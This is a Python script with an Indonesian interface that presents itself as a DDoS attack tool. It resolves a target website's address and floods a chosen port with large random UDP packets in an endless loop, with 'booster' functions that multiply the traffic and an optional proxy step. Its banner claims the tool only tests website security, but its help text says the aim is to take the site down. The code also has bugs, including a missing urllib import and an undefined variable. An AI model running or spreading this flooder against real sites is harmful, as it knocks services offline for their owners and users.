import os, sys, time, random, socket, optparse

#kolor
if sys.platform in ["linux", "linux2"]:
    p = '\033[1;39m'
    m = '\033[1;91m'
    o = '\033[1;93m'
    h = '\033[1;92m'
    k = '\033[1;33m'
    pr = '\033[0;39m'
    mr = '\033[0;91m'
    ors = '\033[0;93m'
    hr = '\033[0;92m'
    kr = '\033[0;33m'
    mp = '\033[3;39m'
    mm = '\033[3;91m'
    mo = '\033[3;93m'
    mh = '\033[3;92m'
    mk = '\033[3;33m'
    bp = '\033[7;39m'
    bk = '\033[7;33m'
    bo = '\033[7;93m'
    bh = '\033[7;92m'
    bm = '\033[7;91m'
else:
    mp = ''
    mo = ''
    mh = ''
    mk = ''
    p = ''
    m = ''
    o = ''
    h = ''
    k = ''
    pr = ''
    mr = ''
    ors = ''
    hr = ''
    kr = ''
    bp = ''
    bm = ''
    bo = ''
    bh = ''
    bk = ''
os.system('cls||clear')
#Menu

banner = h+'''
#==================================================#
 +============|'''+k+''' DDOS ATTACK (REMAKE)'''+h+''' |============+
 +'''+p+''' Author	: Sreetx(Programmer Pemula)'''+h+'''       +
 +'''+p+''' Description  : Programmed In Python3'''+h+'''           +
 +'''+p+''' Github	: https://github.com/Sreetx'''+h+'''       +
 +================================================+
+==================================================+
 '''+k+'''+------------------'''+m+'''| WARNING '''+k+'''|-------------------+
 +'''+p+''' We are not responsible for anything we do!'''+h+'''     +
 +'''+p+''' This Tool's is only used to check web security'''+h+''' +
 +'''+k+'''-----------------|'''+m+''' PERINGATAN '''+k+'''|-----------------+
 +'''+p+''' Kami tidak bertanggung jawab atas apapun yang'''+h+'''  +
 +'''+p+''' anda lakukan. alat ini hanya digunakan untuk'''+h+'''   +
 +'''+p+''' mengecek keamanan website saja'''+h+'''                 +
'''+h+'''#==================================================#
'''+pr
def start(host):
    try:
        baca = bm+'''
CATATAN:'''+pr+'''

	DDOS AttackV2.8
Script DDOS Attack yang kami buat digunakan untuk menguji seberapa tangguh keamanan website terhadap serangan ddos. Jangan gunakan script ini untuk tindak kejahatan. {[!] Penting: Kami tidak bertanggung jawab atas apapun yang anda lakukan apapun itu.}

Deskripsi:
Cara kerja tool's DDOS Attack yg kami buat adalah mengirimkan lonjakan tekanan yang sangat besar pada web tersebut sampai web tersebut down. Untuk menggunakan menu --booster pastikan kartu kamu itu internet gratisan. Kalo nggak, kuota lu bakalan habis.

Follow dan subscribe beberapa akun kami yaakk...

 Github:
        https://github.com/Sreetx/
 Intagram:
        https://www.instagram.com/memelucubikin/
 YouTube:
        https://youtube.com/channel/UCscuxW-ZUViftGyJ9Z1cPbw/	
[INFO] 
Gunakan booster untuk meningkatkan kekuatan serangan ddos yang kamu lakukan, ingat, jika ingin menggunakan booster kamu harus menggunakan wifi, jika mengunakan kuota data kamu akan rugi karena pemakaian yang sangat boros, lebih baik gunakan mode biasa dengan ukuran paket yang sangat rendah seperti 10MB jika anda tidak terhubung ke wifi.

Tekan CTRL+C Untuk Keluar
Pada saat penyerangan Tekan CTRL+C Untuk Menjeda
Masukkan kepala website agar script bisa bekerja, misal "target.com"
Ingat masukan kepala website yang berarti tanpa https:// atau http://

Batas kecepatan internet maksimal yang dihasilkan script ini untuk melakukan serangan ddos: 75,80%, kecepatan minimum: 46,72%

'''+bk+'''[PENTING]'''+mm+pr+mm+'''
    PERINGATAN!!! JANGAN DISALAHGUNAKAN KARENA BISA BERAKIBAT FATAL. KAMI TIDAK BERTANGGUNG JAWAB ATAS APAPUN YANG TELAH KALIAN LAKUKAN!!!'''+pr+'''
        
Segitu aja ya guys, selamat menggunakan...'''
        print(banner)
        print(baca)
        enter = input(k+'\n [</>] Tekan enter untuk melanjutkan!')
        ip0 = socket.gethostbyname(str(host))
        print (m+"\n[*] Mendapatkan IP: ["+bm+ ip0 +mr+m+"]"+pr)
        print(o+"[INFO] IP akan berubah ubah dalam proses penyerangan, itu artinya(lihat teks dibawah)")
        time.sleep(3)
        print (m+"[*] [Ip Terkunci]" )
        time.sleep(3)
        print ("[*] Memulai Menyerang ["+bm+ host +mr+m+"]...."+pr)
        time.sleep(3)
    except socket.gaierror: print(k+' [!] Gagal mendapatkan IP, Harap perhatikan penulisan alamat target'+pr);sys.exit()
    except KeyboardInterrupt: print (h+"\n [*] Mematikan Program....\n"+pr);time.sleep(3);sys.exit()
    except EOFError: print (h+"\n [*] Mematikan Program....\n"+pr);time.sleep(3);sys.exit()

#Jeda
def jeda():
    print(h+'\n [*] Jeda....')
    tanya = input('  [?] Lanjutkan atau Matikan program? ['+bh+'L/'+bo+'M'+pr+h+']: ')
    if tanya.lower() == 'l':
        print(m+'  [!] Melanjutkan Penyerangan....'+pr);time.sleep(3)
    elif tanya.lower() == 'm':
        print (h+"\n   [*] Menghentikan Penyerangan...."+pr);time.sleep(1);print ("   [*] Mematikan Program....\n");time.sleep(3);sys.exit()
    else:
        pass

#DDOS Attack
def ddos(host, port, paket):
    try:
        ip = socket.gethostbyname(str(host))
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 + int(paket))
        sent = 50000
        ddos.sendto(bytes, (ip, int(port)))
        sent = sent + 1
        print (h+" [*] Menyerang "+bm+ ip +hr+h+" Di Port"+bm, port, hr+h+"Dengan Ukuran"+bm , paket, hr+h+"MB"+pr)
    except socket.error: print (m+"""\n[!] Socket error, Time out sambungan....
 """+k+"""[#] Restart script ini atau sumber internet anda
 [#] Mungkin paket yang anda masukan terlalu besar
 [#] Max paket: 15507MB. Paket yang anda masukkan""", paket, """MB\n"""+pr);sys.exit()
    except socket.gaierror: print(m+' [!] IP Target hilang, mungkin target telah down atau pihak web menggunakan plugin untuk mengamankan web nya'+pr);print('\n [*] Mematikan program....\n');time.sleep(3);sys.exit()
    except TimeoutError: print (m+"[!] Time out sambungan. Koneksi internet anda terputus"+pr);sys.exit()
    except (EOFError, KeyboardInterrupt):
        jeda()
    except OSError: print (m+" [!] Koneksi Anda Terputus"+pr);sys.exit()

#Booster DDOS
def bost():
    print(h+'[!] Booster aktif'+pr);time.sleep(3)
    while True:
        try:
            ddos(host, port, paket)
            booster(host, port, paket)
            booster2(host, port, paket)
            booster3(host, port, paket)
            booster4(host, port, paket)
            booster5(host, port, paket)
        except KeyboardInterrupt: print(h+'\n [!] Tidak bisa menggunakan booster! Anda belum memasukkan opsi target dan port\n'+pr);sys.exit()

def booster(host, port, paket):
    try:
        ip1 = socket.gethostbyname(str(host))
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 +int(paket))
        sent = 50000 +int(paket)
        ddos.sendto(bytes, (ip1, int(port)))
        sent = sent + 1
        print (h+" [*] Menyerang "+bm+ ip1 +h+" Di Port"+bm, port, h+"Dengan Ukuran"+bm, paket, hr+h+"MB"+pr)
    except TimeoutError: print (m+"[!] Time out sambungan. Koneksi internet anda terputus"+pr);sys.exit()
    except (EOFError, KeyboardInterrupt):
        jeda()
    except OSError: print (m+"[!] Koneksi Anda Terputus"+pr);sys.exit()
    
def booster2(host, port, paket):
    try:
        ip2 = socket.gethostbyname(str(host))
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 +int(paket))
        sent = 50000 +int(paket)
        ddos.sendto(bytes, (ip2, int(port)))
        sent = sent + 1
        print (h+" [*] Menyerang "+bm+ ip2 +hr+h+" Di Port"+bm, port, hr+h+"Dengan Ukuran"+bm, paket, hr+h+"MB"+pr)
    except TimeoutError: print (m+"[!] Time out sambungan. Koneksi internet anda terputus"+pr);sys.exit()
    except (EOFError, KeyboardInterrupt):
        jeda()
    except OSError: print (m+"[!] Koneksi Anda Terputus"+pr);sys.exit()
    
def booster3(host, port, paket):
    try:
        ip3 = socket.gethostbyname(str(host))
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 +int(paket))
        sent = 50000 +int(paket)
        ddos.sendto(bytes, (ip3, int(port)))
        sent = sent + 1
        print (h+" [*] Menyerang "+bm+ ip3 +hr+h+" Di Port"+bm, port, hr+h+"Dengan Ukuran"+bm, paket, hr+h+"MB"+pr)
    except TimeoutError: print (m+"[!] Time out sambungan. Koneksi internet anda terputus"+pr);sys.exit()
    except (EOFError, KeyboardInterrupt):
        jeda()
    except OSError: print (m+"[!] Koneksi Anda Terputus"+pr);sys.exit()
    
def booster4(host, port, paket):
    try:
        ip4 = socket.gethostbyname(str(host))
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 +int(paket))
        sent = 50000 +int(paket)
        ddos.sendto(bytes, (ip4, int(port)))
        sent = sent + 1
        print (h+" [*] Menyerang "+bm+ ip4 +hr+h+" Di Port"+bm, port, hr+h+"Dengan Ukuran"+bm, paket, hr+h+"MB"+pr)
    except TimeoutError: print (m+"[!] Time out sambungan. Koneksi internet anda terputus"+pr);sys.exit()
    except (EOFError, KeyboardInterrupt):
        jeda()
    except OSError: print (m+"[!] Koneksi Anda Terputus"+pr);sys.exit()
    
def booster5(host, port, paket):
    try:
        ip5 = socket.gethostbyname(str(host))
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 +int(paket))
        sent = 50000 +int(paket)
        ddos.sendto(bytes, (ip5, int(port)))
        sent = sent + 1
        print (h+" [*] Menyerang "+bm+ ip2 +hr+h+" Di Port"+bm, port, hr+h+"Dengan Ukuran"+bm, paket, hr+h+"MB"+pr)
    except TimeoutError: print (m+"[!] Time out sambungan. Koneksi internet anda terputus"+pr);sys.exit()
    except (EOFError, KeyboardInterrupt):
        jeda()
    except OSError: print (m+"[!] Koneksi Anda Terputus"+pr);sys.exit()

def proxy(prxy):
    try:
        print(h+' [~] Menghubungkan ke proxy....'+pr)
        proxi = urllib.request.ProxyHandler({"http" : "http://"+prxy})
        urllib.request.urlopen('http://'+prxy, data=proxi)
        print(h+' [+] Tersambung'+pr);time.sleep(2)
    except KeyboardInterrupt: print(m+' [!] Gagal tersambung'+pr); sys.exit()
            
def bant():
    print(banner)
    print('''python '''+sys.argv[0]+''' [OPTIONS]
Perintah:
    --t --target        Masukkan kepala alamat website target. Contoh: --t website.com
    --p --port          Masukkan port. Contoh: --p 8080
    --pt --paket        Masukkkan jumlah paket yang akan dikirimkan. Contoh: --pt 100
    --hh --hlp          Gunakan perintah ini jika membutuhkan bantuan. Contoh: --hh
    --b --booster       Gunakan ini jika membutuhkan booster serangan. Contoh: --booster
    --proxy             Gunakan ini jika membutuhkan proxy. Contoh: --proxy 123.45.67:443
Contoh penggunaan:
    Normal:
        python '''+sys.argv[0]+''' --t website.com --p 443 --pt 100
    Menggunakan Booster:
        python '''+sys.argv[0]+''' --t website.com --p 443 --pt 100 --booster
        python '''+sys.argv[0]+''' --t website.com --p 443 --pt 100 --proxy 123.45.67:443
        python '''+sys.argv[0]+''' --t website.com --p 443 --pt 100 --proxy 123.45.67:443 --booster\n''')

parse = optparse.OptionParser('\n  [?] Belum bisa menggunakan? Ketikan perintah python '+sys.argv[0]+' --hlp Untuk meminta bantuan')
parse.add_option('--t','--target','-T','--TARGET', dest='target', type='string')
parse.add_option('--p','--port','--P','--PORT', dest='port', type='string')
parse.add_option('--proxy', dest='proxy', type='string')
parse.add_option('--pt','--paket','--PT','--PAKET', dest='paket')
parse.add_option('--b','--booster','--B','--BOOSTER', dest='booster', action='store_true', default=False)
parse.add_option('--hh','--hlp','--HH','--HLP', dest='hlp', action='store_true', default=False)

(options,argv) = parse.parse_args()
host = options.target
boster = options.booster
port = options.port
prxy = options.proxy
paket = options.paket
hlp = options.hlp
opts = [host, port, boster, prxy]
if host:
    start(host)
    if prxy:
        proxy(prxy)
    while True:
        try:
            if boster:
                 bost()
            ddos(host, port, paket)
        except (KeyboardInterrupt, EOFError): pass;sys.exit()
if hlp:
    bant()
else:
    print(parse.usage);sys.exit()
